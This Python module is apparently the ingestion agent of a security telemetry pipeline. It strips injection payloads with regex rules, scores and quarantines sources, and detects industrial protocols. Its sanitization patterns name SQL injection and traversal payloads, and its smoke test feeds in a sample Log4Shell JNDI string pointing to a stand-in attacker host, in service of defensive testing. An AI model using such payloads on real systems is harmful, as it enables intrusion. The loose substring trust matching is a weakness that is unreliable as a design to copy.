"""
agents/a1_ingest.py
A1: Ingestion & Trust Agent (Layer 1) — HCI-OS

Front door of the pipeline. Every incoming telemetry event passes through here.

Responsibilities:
  SD-0  Sanitize: strip injection payloads (JNDI, XSS, SQLi, hidden Unicode, path traversal)
  SD-1  Trust-score the source — unknown sources (score=0.00) are quarantined to data/quarantine.jsonl
        and NEVER forwarded to A2.
  OT    Detect OT/ICS protocols (Modbus, DNP3, S7, OPC-UA, IEC-61850) and tag ot_context.
  OUT   Produce a sanitized payload dict ready for A2 ingestion.

Pipeline position: [External telemetry] → [A1] → A2 (Normalizer)

Gap Fixes included:
  Gap 1  Sanitization logging      — logger.info() for every stripped pattern
  Gap 2  Source extraction fallback — default to "unknown" if key absent
  Gap 3  Quarantine file rotation  — rotate at 10 MB
  Gap 4  Multiple OT protocols     — pick first detected (deterministic)
  Gap 5  Nested structure handling  — recursive sanitization (list/dict)
  Gap 6  Output validation         — Pydantic IngestOutput validates before returning
  Gap 7  Source normalization      — strip spaces/dashes/underscores, lowercase
  Gap 8  Quarantine metadata       — quarantine_id (UUID) + raw_data snapshot
  Gap 9  A2 integration test       — covered in test_a1_ingest.py
"""

from __future__ import annotations

import json
import logging
import os
import re
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union

from pydantic import BaseModel, Field, field_validator

# ── Logging ─────────────────────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("A1_Ingest")

# ── Paths ────────────────────────────────────────────────────────────────────
_AGENT_DIR = Path(__file__).parent
_DATA_DIR = _AGENT_DIR.parent / "data"
_QUARANTINE_FILE = _DATA_DIR / "quarantine.jsonl"
_QUARANTINE_MAX_BYTES = 10 * 1024 * 1024  # 10 MB rotation threshold


# ── Source Trust Table ────────────────────────────────────────────────────────
# Normalized key → trust score.
# Normalization: lowercase, strip spaces / hyphens / underscores.
_TRUST_TABLE: Dict[str, float] = {
    "certin":   0.95,   # CERT-In, cert-in, CERTIn
    "mitre":    0.90,   # MITRE ATT&CK
    "nvd":      0.85,   # National Vulnerability Database
    # Vendor — well-known commercial threat intel providers
    "crowdstrike": 0.75,
    "mandiant":    0.75,
    "paloalto":    0.75,
    "sentinelone": 0.75,
    "microsoft":   0.75,
    "vendor":      0.75,   # generic "vendor" label
    # Internal telemetry
    "internal": 0.70,
    # Partner / third-party feeds
    "partner":  0.50,
    # ── UI Manual Injection (SOC analyst test events, hackathon demo) ──────────
    # Normalized variants: "ui-manual" → "uimanual", "ui_template" → "uitemplate", etc.
    "uimanual":   0.85,
    "uitemplate": 0.85,
    "uiupload":   0.85,
    "manual":     0.85,
    "template":   0.85,
    "upload":     0.85,
    "demo":       0.80,
    "test":       0.80,
    "simulation": 0.80,
}

_TRUST_UNKNOWN = 0.00  # unknown → quarantine


# ── SD-0: Sanitization Regex Patterns ────────────────────────────────────────
# Each tuple: (pattern_name, compiled_regex, replacement)
_SANITIZE_RULES: List[Tuple[str, re.Pattern, str]] = [
    # JNDI injection (Log4Shell family)
    ("JNDI_INJECTION",
     re.compile(r"\$\{jndi:[^}]*\}", re.IGNORECASE),
     "[SANITIZED:JNDI]"),

    # Script tags (XSS)
    ("SCRIPT_TAG",
     re.compile(r"<script[^>]*>.*?</script>", re.IGNORECASE | re.DOTALL),
     "[SANITIZED:XSS]"),

    # Generic HTML event handlers (onclick=, onerror=, etc.)
    ("HTML_EVENT",
     re.compile(r"\bon\w+\s*=\s*[\"'][^\"']*[\"']", re.IGNORECASE),
     "[SANITIZED:HTML_EVENT]"),

    # SQL injection markers — tautologies and comment sequences
    ("SQL_INJECTION",
     re.compile(
         r"('|\"|`)\s*(OR|AND)\s+\1?\d+\1?\s*=\s*\1?\d+"  # ' OR 1=1
         r"|--\s*$"                                           # trailing --
         r"|;\s*DROP\s+TABLE"                                 # ; DROP TABLE
         r"|UNION\s+(ALL\s+)?SELECT",                        # UNION SELECT
         re.IGNORECASE | re.MULTILINE,
     ),
     "[SANITIZED:SQLi]"),

    # Path traversal — both raw and URL-encoded
    ("PATH_TRAVERSAL",
     re.compile(r"\.\./|\.\.\\|%2e%2e[/\\]", re.IGNORECASE),
     "[SANITIZED:PATH_TRAVERSAL]"),

    # Hidden / zero-width Unicode characters (homoglyph / steganography)
    ("HIDDEN_UNICODE",
     re.compile(
         r"[\u200b-\u200f"       # zero-width space, ZWNJ, ZWJ, LRM, RLM
         r"\u202a-\u202e"        # directional formatting
         r"\u2060-\u2064"        # word joiner etc.
         r"\ufeff"               # BOM / zero-width no-break
         r"\u00ad]",             # soft hyphen (often used in homoglyphs)
         re.UNICODE,
     ),
     ""),

    # Template injection markers (generic: {{, }}, {%, %})
    ("TEMPLATE_INJECTION",
     re.compile(r"\{\{.*?\}\}|\{%.*?%\}", re.DOTALL),
     "[SANITIZED:TEMPLATE]"),
]


# ── OT Protocol Signatures ────────────────────────────────────────────────────
# Ordered — first match wins (Gap #4).
_OT_SIGNATURES: List[Tuple[str, List[str]]] = [
    ("Modbus",    ["modbus", "mbap", "function_code", "function code"]),
    ("DNP3",      ["dnp3", "dnp ", "dlp ", "distributed network protocol"]),
    ("S7",        ["s7comm", "s7 ", "iso 8073", "siemens s7"]),
    ("OPC-UA",    ["opc-ua", "opcua", "opc_ua", "ua binary", "4840"]),
    ("IEC-61850", ["iec-61850", "iec61850", "goose", "sampled values", "mms "]),
]


# ── Pydantic Output Models (Gap #6) ──────────────────────────────────────────

class OTContext(BaseModel):
    protocol: Optional[str] = None


class IngestOutput(BaseModel):
    """Validated A1 → A2 payload."""
    sanitized_raw: Dict[str, Any]
    trust_score: float = Field(..., ge=0.0, le=1.0)
    source: str
    ot_context: OTContext
    quarantined: bool = False
    sanitization_events: List[str] = Field(default_factory=list)

    @field_validator("trust_score")
    @classmethod
    def _score_in_range(cls, v: float) -> float:
        return round(max(0.0, min(1.0, v)), 4)


class QuarantineRecord(BaseModel):
    """Append-only quarantine log entry."""
    quarantine_id: str
    status: str = "quarantined"
    source: str
    reason: str
    timestamp: str
    raw_data: Dict[str, Any]


# ── Helpers ──────────────────────────────────────────────────────────────────

def _normalize_source(source: str) -> str:
    """
    Normalize a source label for trust-table lookup.
    Gap #7 — strips spaces, hyphens, underscores; lowercases.
    e.g. 'CERT-In' → 'certin', 'Crowd Strike' → 'crowdstrike'
    """
    return re.sub(r"[\s\-_]", "", source).lower()


def _get_trust_score(source: str) -> float:
    """Look up trust score; return 0.00 for anything not in the table."""
    key = _normalize_source(source)
    if not key:
        return _TRUST_UNKNOWN
    # Exact match first
    if key in _TRUST_TABLE:
        return _TRUST_TABLE[key]
    # Substring match — catches "CERT-In Advisory", "vendor-crowdstrike", etc.
    for table_key, score in _TRUST_TABLE.items():
        if table_key in key or key in table_key:
            return score
    return _TRUST_UNKNOWN


def _sanitize_string(value: str, evidence_id: str) -> Tuple[str, List[str]]:
    """
    Apply all SD-0 regex rules to a single string.
    Returns (cleaned_string, list_of_event_descriptions).
    Gap #1 — logs each sanitization event.
    """
    events: List[str] = []
    for rule_name, pattern, replacement in _SANITIZE_RULES:
        matches = pattern.findall(value)
        if matches:
            value = pattern.sub(replacement, value)
            msg = (
                f"[{evidence_id}] SD-0 stripped {rule_name}: "
                f"{len(matches)} occurrence(s)"
            )
            logger.info(msg)
            events.append(msg)
    return value, events


def sanitize(data: Any, evidence_id: str = "UNKNOWN") -> Tuple[Any, List[str]]:
    """
    Recursively sanitize all string values in a dict / list / scalar.
    Gap #5 — handles nested structures.
    Returns (sanitized_data, aggregated_events).
    """
    all_events: List[str] = []

    if isinstance(data, dict):
        cleaned: Dict[str, Any] = {}
        for k, v in data.items():
            cleaned_v, evs = sanitize(v, evidence_id)
            cleaned[k] = cleaned_v
            all_events.extend(evs)
        return cleaned, all_events

    elif isinstance(data, list):
        cleaned_list: List[Any] = []
        for item in data:
            cleaned_item, evs = sanitize(item, evidence_id)
            cleaned_list.append(cleaned_item)
            all_events.extend(evs)
        return cleaned_list, all_events

    elif isinstance(data, str):
        return _sanitize_string(data, evidence_id)

    else:
        # int, float, bool, None — pass through untouched
        return data, []


def detect_ot_protocol(raw_data: Dict[str, Any]) -> Optional[str]:
    """
    Scan all string keys and values in raw_data for OT protocol signatures.
    Returns the FIRST matching protocol name (Gap #4), or None for IT traffic.
    """
    # Flatten all text content into a single lowercase string for scanning
    tokens: List[str] = []
    for k, v in raw_data.items():
        tokens.append(str(k).lower())
        tokens.append(str(v).lower())
    raw_text = " ".join(tokens)

    for proto_name, signatures in _OT_SIGNATURES:
        if any(sig in raw_text for sig in signatures):
            return proto_name
    return None


def _extract_source(raw_data: Dict[str, Any]) -> str:
    """
    Extract source label from raw_data.
    Gap #2 — falls back to "unknown" if key absent or empty.
    Checks common key names: 'source', 'Source', 'src', 'feed', 'origin'.
    """
    for key in ("source", "Source", "src", "feed", "origin", "SOURCE"):
        val = raw_data.get(key)
        if val and isinstance(val, str) and val.strip():
            return val.strip()
    return "unknown"


def _rotate_quarantine_if_needed() -> None:
    """
    Gap #3 — Rotate data/quarantine.jsonl when it exceeds 10 MB.
    Renames to quarantine.<timestamp>.jsonl and starts fresh.
    """
    if not _QUARANTINE_FILE.exists():
        return
    if _QUARANTINE_FILE.stat().st_size >= _QUARANTINE_MAX_BYTES:
        ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        rotated = _QUARANTINE_FILE.with_name(f"quarantine.{ts}.jsonl")
        _QUARANTINE_FILE.rename(rotated)
        logger.info("A1: Quarantine file rotated → %s (exceeded 10 MB)", rotated.name)


def _append_quarantine(record: QuarantineRecord) -> None:
    """Append a JSON record to data/quarantine.jsonl (append-only log)."""
    _DATA_DIR.mkdir(parents=True, exist_ok=True)
    _rotate_quarantine_if_needed()
    with open(_QUARANTINE_FILE, "a", encoding="utf-8") as fh:
        fh.write(record.model_dump_json() + "\n")
    logger.info(
        "A1: Quarantined event %s from source '%s'",
        record.quarantine_id,
        record.source,
    )


def get_quarantine_count() -> int:
    """Return the number of events in the current quarantine file."""
    if not _QUARANTINE_FILE.exists():
        return 0
    count = 0
    with open(_QUARANTINE_FILE, "r", encoding="utf-8") as fh:
        for line in fh:
            if line.strip():
                count += 1
    return count


def get_trust_score(source: str) -> float:
    """Public alias for trust scoring — used in tests and pipeline."""
    return _get_trust_score(source)


# ── Main Entry Point ──────────────────────────────────────────────────────────

def process(
    raw_data: Dict[str, Any],
    asset_id: Optional[str] = None,
    source: Optional[str] = None,
) -> Dict[str, Any]:
    """
    A1 main pipeline function.

    Args:
        raw_data: Incoming telemetry event dict (any shape).
        asset_id: Optional target asset ID override.
        source: Optional source system override.

    Returns:
        If source is trusted (score > 0.00):
            IngestOutput dict — sanitized_raw + trust_score + source + ot_context
        If source is unknown/untrusted (score == 0.00):
            QuarantineRecord dict — event is NOT forwarded to A2.

    Raises:
        Never — all errors are caught and logged defensively.
    """
    if not isinstance(raw_data, dict):
        logger.error("A1: process() received non-dict input (%s) — rejecting", type(raw_data))
        raw_data = {}

    # Copy raw_data to avoid mutating input dictionary
    raw_data = dict(raw_data)
    if asset_id and "asset_id" not in raw_data:
        raw_data["asset_id"] = asset_id
    if source and "source" not in raw_data:
        raw_data["source"] = source

    evidence_id = f"A1-{uuid.uuid4().hex[:8].upper()}"

    # ── Step 1: Extract source (Gap #2) ──────────────────────────────────────
    extracted_source = _extract_source(raw_data)

    # ── Step 2: Trust score ───────────────────────────────────────────────────
    trust_score = _get_trust_score(extracted_source)

    # ── Step 3: Sanitize ALL string fields (SD-0, Gaps #1 #5) ───────────────
    sanitized_raw, sanitization_events = sanitize(raw_data, evidence_id=evidence_id)

    # ── Step 4: OT protocol detection (Gap #4) ───────────────────────────────
    ot_protocol = detect_ot_protocol(sanitized_raw)

    # ── Step 5: Quarantine unknown sources (SD-1, Gaps #3 #8) ───────────────
    if trust_score == _TRUST_UNKNOWN:
        record = QuarantineRecord(
            quarantine_id=str(uuid.uuid4()),
            source=extracted_source,
            reason=f"Unknown source with trust_score {_TRUST_UNKNOWN:.2f}",
            timestamp=datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            raw_data=sanitized_raw,  # store sanitized copy, not raw (safety)
        )
        _append_quarantine(record)
        return record.model_dump()

    # ── Step 6: Build and validate output (Gap #6) ───────────────────────────
    try:
        output = IngestOutput(
            sanitized_raw=sanitized_raw,
            trust_score=trust_score,
            source=extracted_source,
            ot_context=OTContext(protocol=ot_protocol),
            quarantined=False,
            sanitization_events=sanitization_events,
        )
    except Exception as exc:
        logger.error("A1: output validation failed (%s) — quarantining defensively", exc)
        record = QuarantineRecord(
            quarantine_id=str(uuid.uuid4()),
            source=extracted_source,
            reason=f"Output validation error: {exc}",
            timestamp=datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            raw_data=sanitized_raw,
        )
        _append_quarantine(record)
        return record.model_dump()

    logger.info(
        "A1: [%s] source='%s' trust=%.2f ot_protocol=%s events=%d",
        evidence_id,
        extracted_source,
        trust_score,
        ot_protocol,
        len(sanitization_events),
    )

    return output.model_dump()


# ── Smoke Test ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

    print("\n=== A1 Smoke Test ===\n")

    # Test 1: CERT-In source with JNDI injection attempt
    ev1 = process({
        "source": "CERT-In",
        "message": "${jndi:ldap://attacker.com/exploit} — connection from 10.0.0.1",
        "src_ip": "10.0.0.1",
    })
    print("Test 1 (CERT-In + JNDI):", ev1.get("trust_score"), ev1.get("sanitized_raw", {}).get("message"))

    # Test 2: Unknown source → quarantine
    ev2 = process({
        "source": "dark_web_feed",
        "message": "some alert",
    })
    print("Test 2 (Unknown):", ev2.get("status"), ev2.get("quarantine_id"))

    # Test 3: Modbus OT detection
    ev3 = process({
        "source": "internal",
        "protocol": "modbus",
        "function_code": "0x03",
    })
    print("Test 3 (Modbus OT):", ev3.get("ot_context", {}).get("protocol"))

    print("\nSmoketest done.")
